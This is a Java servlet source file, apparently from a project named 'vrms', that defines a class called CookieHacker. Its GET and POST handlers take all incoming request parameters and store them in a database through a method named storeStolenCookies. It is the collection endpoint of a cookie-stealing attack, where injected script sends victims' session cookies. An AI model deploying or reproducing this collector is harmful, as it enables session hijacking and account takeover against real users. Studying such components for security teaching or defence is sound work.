/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package com.vrms.authentication.core;

import java.io.IOException;
import java.io.PrintWriter;
import java.util.Map;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 *
 * @author Ashok
 */
public class CookieHacker extends HttpServlet {

    @Override
        protected void doGet(HttpServletRequest request, 
                        HttpServletResponse response) 
        throws ServletException, IOException {
                storeStolenCookies(request.getParameterMap());
        }
        
        @Override
        protected void doPost(HttpServletRequest request, 
                        HttpServletResponse response) 
        throws ServletException, IOException {
                doGet(request, response);
        }
        
        private void storeStolenCookies(Map cookies) {
                IDatabase database  = Database.getInstance();
                database.saveCookies(cookies);
        }

}
